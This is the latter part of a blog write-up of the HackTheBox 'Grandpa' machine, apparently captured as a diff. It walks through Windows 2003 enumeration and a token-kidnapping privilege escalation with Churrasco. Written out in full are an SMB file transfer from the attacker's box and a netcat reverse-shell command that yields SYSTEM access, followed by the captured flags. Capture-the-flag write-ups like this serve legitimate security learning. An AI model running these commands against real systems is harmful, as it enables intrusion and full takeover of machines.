+<span class="go">Boot Device:               \Device\HarddiskVolume1</span>
+<span class="go">System Locale:             en-us;English (United States)</span>
+<span class="go">Input Locale:              en-us;English (United States)</span>
+<span class="go">Time Zone:                 (GMT+02:00) Athens, Beirut, Istanbul, Minsk</span>
+<span class="go">Total Physical Memory:     1,023 MB</span>
+<span class="go">Available Physical Memory: 795 MB</span>
+<span class="go">Page File: Max Size:       2,470 MB</span>
+<span class="go">Page File: Available:      2,329 MB</span>
+<span class="go">Page File: In Use:         141 MB</span>
+<span class="go">Page File Location(s):     C:\pagefile.sys</span>
+<span class="go">Domain:                    HTB</span>
+<span class="go">Logon Server:              N/A</span>
+<span class="go">Hotfix(s):                 1 Hotfix(s) Installed.</span>
+<span class="go">                           [01]: Q147222</span>
+<span class="go">Network Card(s):           N/A</span>
+</pre></div>
+
+
+<p><code>systeminfo</code> shows this is a x86 based Windows 2003 server with no hotfix installed.</p>
+<p>I can see two users directories under Documents and Settings:</p>
+<div class="highlight"><pre><span></span><span class="go">C:\Documents and Settings&gt;dir</span>
+<span class="go">dir</span>
+<span class="go"> Volume in drive C has no label.</span>
+<span class="go"> Volume Serial Number is 246C-D7FE</span>
+
+<span class="go"> Directory of C:\Documents and Settings</span>
+
+<span class="go">04/12/2017  05:32 PM    &lt;DIR&gt;          .</span>
+<span class="go">04/12/2017  05:32 PM    &lt;DIR&gt;          ..</span>
+<span class="go">04/12/2017  05:12 PM    &lt;DIR&gt;          Administrator</span>
+<span class="go">04/12/2017  05:03 PM    &lt;DIR&gt;          All Users</span>
+<span class="go">04/12/2017  05:32 PM    &lt;DIR&gt;          Harry</span>
+<span class="go">               0 File(s)              0 bytes</span>
+<span class="go">               5 Dir(s)  18,090,868,736 bytes free</span>
+
+<span class="go">C:\Documents and Settings&gt;cd harry</span>
+<span class="go">cd harry</span>
+<span class="go">Access is denied.</span>
+</pre></div>
+
+
+<p>I was unable to access the "Harry" directory where most probably the <code>user.txt</code> is located.</p>
+<p>Then I can see the <code>SeImpersonatePrivilege</code> is enables which means we can probably use Juicy Potato to escalate privileges:</p>
+<div class="highlight"><pre><span></span><span class="go">C:\Documents and Settings&gt;whoami /priv</span>
+<span class="go">whoami /priv</span>
+
+<span class="go">PRIVILEGES INFORMATION</span>
+<span class="go">----------------------</span>
+
+<span class="go">Privilege Name                Description                               State   </span>
+<span class="go">============================= ========================================= ========</span>
+<span class="go">SeAuditPrivilege              Generate security audits                  Disabled</span>
+<span class="go">SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled</span>
+<span class="go">SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled</span>
+<span class="go">SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled </span>
+<span class="go">SeImpersonatePrivilege        Impersonate a client after authentication Enabled </span>
+<span class="go">SeCreateGlobalPrivilege       Create global objects                     Enabled </span>
+</pre></div>
+
+
+<p>Wait a minute! this is Windows 2003 and probably not part of the list of OSs we can exploit with Juicy Potato. In fact, checking at http://ohpe.it/juicy-potato/CLSID/ we can see this list:</p>
+<ul>
+<li>Windows 7 Enterprise</li>
+<li>Windows 8.1 Enterprise</li>
+<li>Windows 10 Enterprise</li>
+<li>Windows 10 Professional</li>
+<li>Windows Server 2008 R2 Enterprise</li>
+<li>Windows Server 2012 Datacenter</li>
+<li>Windows Server 2016 Standard</li>
+</ul>
+<p>After some research, I found this <a href="https://medium.com/@liau.weijie/escalate-yourself-on-windows-platform-885acd2a51ce">post</a>. Point <code>\x03</code> of the post mentions about "Windows 2003 / IIS6.0 with Network Service", which is exactly the situation we are in. The article then refers to the <a href="https://www.exploit-db.com/exploits/6705">Microsoft Windows Server 2003 - Token Kidnapping Local Privilege Escalation exploit</a>. The exploit will basically allow to add a user under Local Administrators Group hence obtaining admin rights.</p>
+<p>That being said, the exploit refers to a zip file dubbed Churrasco. Looking around in the web I found a binary at https://github.com/Re4son/Churrasco/raw/master/churrasco.exe so I download it on my Kali box.</p>
+<p>I started looking for a place where to put that file on the victim machine. I tried the "All Users" directory but I failed in copying the file over. I then found the <code>FPSE_search</code> directory under <code>C:\</code> and it seems like we have permissions to write there:</p>
+<div class="highlight"><pre><span></span><span class="go">C:\&gt;icacls FPSE_search                                                                                </span>
+<span class="go">icacls FPSE_search                                                                                    </span>
+<span class="go">FPSE_search BUILTIN\Administrators:(F)                                                                </span>
+<span class="go">            BUILTIN\Administrators:(I)(OI)(CI)(F)                                                     </span>
+<span class="go">            NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)                                                        </span>
+<span class="go">            CREATOR OWNER:(I)(OI)(CI)(IO)(F)                                                          </span>
+<span class="go">            BUILTIN\Users:(I)(OI)(CI)(RX)                                                             </span>
+<span class="go">            BUILTIN\Users:(I)(CI)(AD)                                                                 </span>
+<span class="go">            BUILTIN\Users:(I)(CI)(WD)                                                                 </span>
+
+<span class="go">Successfully processed 1 files; Failed processing 0 files</span>
+</pre></div>
+
+
+<p><code>AD</code> stands for Add Data wheras <code>WD</code> stands for Write Data.</p>
+<p>Now I start a smbserver on my Kali box:</p>
+<div class="highlight"><pre><span></span><span class="gp">kali@kali:~$</span> sudo smbserver.py share ~/Documents/HTB/boxes/results/10.10.10.14/exploit
+<span class="go">Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation</span>
+
+<span class="go">[*] Config file parsed</span>
+<span class="go">[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0</span>
+<span class="go">[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0</span>
+<span class="go">[*] Config file parsed</span>
+<span class="go">[*] Config file parsed</span>
+<span class="go">[*] Config file parsed</span>
+</pre></div>
+
+
+<p>then I copy the file over:</p>
+<div class="highlight"><pre><span></span><span class="go">C:\FPSE_search&gt;copy \\10.10.14.9\share\churrasco.exe .</span>
+<span class="go">copy \\10.10.14.9\share\churrasco.exe .</span>
+<span class="go">        1 file(s) copied.</span>
+
+<span class="go">C:\FPSE_search&gt;dir</span>
+<span class="go">dir</span>
+<span class="go"> Volume in drive C has no label.</span>
+<span class="go"> Volume Serial Number is 246C-D7FE</span>
+
+<span class="go"> Directory of C:\FPSE_search</span>
+
+<span class="go">10/02/2020  04:06 PM    &lt;DIR&gt;          .</span>
+<span class="go">10/02/2020  04:06 PM    &lt;DIR&gt;          ..</span>
+<span class="go">10/02/2020  03:35 PM            31,232 churrasco.exe</span>
+<span class="go">               1 File(s)         31,232 bytes</span>
+<span class="go">               2 Dir(s)  18,094,141,440 bytes free</span>
+</pre></div>
+
+
+<p>I also copy <code>nc.exe</code> over:</p>
+<div class="highlight"><pre><span></span><span class="go">C:\FPSE_search&gt;copy \\10.10.14.9\share\nc.exe .</span>
+<span class="go">copy \\10.10.14.9\share\nc.exe .</span>
+<span class="go">        1 file(s) copied.</span>
+</pre></div>
+
+
+<p>then I run the exploit as following:</p>
+<div class="highlight"><pre><span></span><span class="go">C:\FPSE_search&gt;churrasco.exe -d &quot;C:\FPSE_search\nc.exe -e cmd.exe 10.10.14.9 4444&quot;</span>
+<span class="go">churrasco.exe -d &quot;C:\FPSE_search\nc.exe -e cmd.exe 10.10.14.9 4444&quot;</span>
+<span class="go">/churrasco/--&gt;Current User: NETWORK SERVICE </span>
+<span class="go">/churrasco/--&gt;Getting Rpcss PID ...</span>
+<span class="go">/churrasco/--&gt;Found Rpcss PID: 680 </span>
+<span class="go">/churrasco/--&gt;Searching for Rpcss threads ...</span>
+<span class="go">/churrasco/--&gt;Found Thread: 684 </span>
+<span class="go">/churrasco/--&gt;Thread not impersonating, looking for another thread...</span>
+<span class="go">/churrasco/--&gt;Found Thread: 688 </span>
+<span class="go">/churrasco/--&gt;Thread not impersonating, looking for another thread...</span>
+<span class="go">/churrasco/--&gt;Found Thread: 696 </span>
+<span class="go">/churrasco/--&gt;Thread impersonating, got NETWORK SERVICE Token: 0x734</span>
+<span class="go">/churrasco/--&gt;Getting SYSTEM token from Rpcss Service...</span>
+<span class="go">/churrasco/--&gt;Found SYSTEM token 0x72c</span>
+<span class="go">/churrasco/--&gt;Running command with SYSTEM Token...</span>
+<span class="go">/churrasco/--&gt;Done, command should have ran as SYSTEM!</span>
+</pre></div>
+
+
+<p>and I get an administrative reverse shell:</p>
+<div class="highlight"><pre><span></span><span class="gp">kali@kali:~$</span> sudo rlwrap nc -lnvp <span class="m">4444</span>
+<span class="go">listening on [any] 4444 ...</span>
+<span class="go">connect to [10.10.14.9] from (UNKNOWN) [10.10.10.14] 1036</span>
+<span class="go">Microsoft Windows [Version 5.2.3790]</span>
+<span class="gp gp-VirtualEnv">(C)</span> <span class="go">Copyright 1985-2003 Microsoft Corp.</span>
+
+<span class="go">C:\WINDOWS\TEMP&gt;whoami</span>
+<span class="go">whoami</span>
+<span class="go">nt authority\system</span>
+</pre></div>
+
+
+<p>From there I was easily able to grab the <code>user.txt</code>:</p>
+<div class="highlight"><pre><span></span><span class="go">C:\Documents and Settings\Harry\Desktop&gt;type user.txt</span>
+<span class="go">type user.txt</span>
+<span class="go">bdff5ec67c3cff017f2bedc146a5d869</span>
+</pre></div>
+
+
+<p>and the <code>root.txt</code>:</p>
+<div class="highlight"><pre><span></span><span class="go">C:\Documents and Settings\Administrator\Desktop&gt;type root.txt</span>
+<span class="go">type root.txt</span>
+<span class="go">9359e905a2c35f861f6a57cecf28bb7b</span>
+</pre></div>
+			<style>
+#pcs-comment-form input,
+#pcs-comment-form textarea {
+	width: 100%;
+}
+#pcs-comment-form-display-replyto {
+	border: solid 1px black;
+	padding: 2px;
+}
+#pcs-comment-form-display-replyto p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+#pcs-comments ul {
+	list-style: none;
+}
+#pcs-comments .comment-left {
+	display: table-cell;
+	padding-right: 10px;
+}
+#pcs-comments .comment-body {
+	display: table-cell;
+	vertical-align: top;
+	width: 100%;
+}
+</style>
+
+	<section id="pcs-comments">
+	<header>
+		<h2>Comments</h2>
+		<hr/>
+	</header>
+		<p>There are no comments yet.</p>
+	<section>
+	<form id="pcs-comment-form" action="#">
+		<legend>Add a Comment</legend>
+		<input type="hidden" id="pcs-comment-form-input-replyto">
+		<fieldset>
+			<label for="pcs-comment-form-input-name">Name</label>
+			<input  id="pcs-comment-form-input-name" type="text" placeholder="Enter your name or nickname" />
+		</fieldset>
+		<fieldset>
+			<label for="pcs-comment-form-input-website">Website</label>
+			<input  id="pcs-comment-form-input-website" type="text" placeholder="Enter your website (optional)" />
+		</fieldset>
+		<fieldset>
+			<label   for="pcs-comment-form-input-textarea">Your Comment</label>
+			<textarea id="pcs-comment-form-input-textarea" rows="5" style="resize:vertical;" placeholder="Your comment"></textarea>
+			<p>You can use the <a href="https://en.wikipedia.org/wiki/Markdown">Markdown</a> syntax to format your comment.</p>
+			<div style="display: none; " id="pcs-comment-form-display-replyto"></div>
+		</fieldset>
+
+		<button type="submit"
+				id="pcs-comment-form-button-submit"
+				>Post via email</button>
+
+			<a href="https://sittingducks.io/feeds/comment.Grandpa.atom.xml">
+				Comment Atom Feed
+			</a>
+	</form>
+</section>
+
+</section>
+
+			<script type="text/javascript" src="https://code.jquery.com/jquery-2.1.4.min.js"></script>
+	<script type="text/javascript" src="https://sittingducks.io/theme/js/comments.js"></script>
+	<script type="text/javascript">
+		$(document).ready(function() {
+			CommentSystem.email_user   = "sittingducks.io";
+			CommentSystem.email_domain = "protonmail.com";
+			CommentSystem.display_replyto_html = function(comment_content, article_slug, author) { 
+				return ''
+					+ '<button style="float:right;" onclick="CommentSystem.cancelReply(); return false;" title="Cancel the reply">'
+					+ 	'×'
+					+ '</button>'
+					+ '<p>This comment will be posted as a reply to \'<a title="'+comment_content+'" href="#comment-'+article_slug+'">'+author+'</a>\'</p>';
+			};
+
+			$('#pcs-comment-form').on("submit",
+				function( event )
+				{
+					event.preventDefault();
+					$(location).attr('href', CommentSystem.getMailtoLink("Grandpa"));
+				}
+			);
+		});
+	</script>
+
+
+      </div><!-- .entry-content -->
+      <br /><br />
+      <div class="article_meta">
+        Tags:
+          <a href="https://sittingducks.io/tag/hackthebox.html">HackTheBox</a>      </div>
+    </div>
+  </div>
+</article><!-- #post-## -->
+                </div>
+              </div><!-- #main -->
+          </div><!-- #primary -->
+        </div>
+      </div><!-- close .row -->
+    </div><!-- close .container -->
+  </div><!-- close .site-content -->
+
+
+
+
+  <div id="footer-area">
+    <footer id="colophon" class="site-footer" role="contentinfo">
+      <div class="site-info container">
+        <div class="row">
+                    <div class="copyright col-md-12">
+                    <a href="https://sittingducks.io/pages/privacy-policy">Privacy Policy</a> | 
+                    <a href="https://sittingducks.io/feeds/all.atom.xml">Atom Feed</a> | 
+                    <a href="https://sittingducks.io/sitemap.xml">Sitemap</a><br />
+                    &copy; 2019 <a href="https://sittingducks.io">Marco Meli</a> </div>
+        </div>
+      </div><!-- .site-info -->
+      <div class="scroll-to-top" style="display: none;"><i class="fa fa-angle-up"></i></div><!-- .scroll-to-top -->
+    </footer><!-- #colophon -->
+  </div>
+
+  <script type="text/javascript">
+    window.addEventListener('load', function(){
+    if (window.location.pathname != '/' && window.location.pathname != '/index.html'){
+      window.scroll(0, document.getElementById('main').offsetTop);
+    }})
+  </script>
+
+  
+ <!-- <script src="https://sittingducks.io/theme/js/jquery.min.js"></script> -->
+	<!-- Make sure jquery is loaded first, then load colorbox -->
+  <script src="https://sittingducks.io/theme/js/jquery.colorbox-min.js"></script>
+  <script src="https://sittingducks.io/theme/js/load-colorbox.js"></script>
+
+
+  
+  
+</body>
+</html>
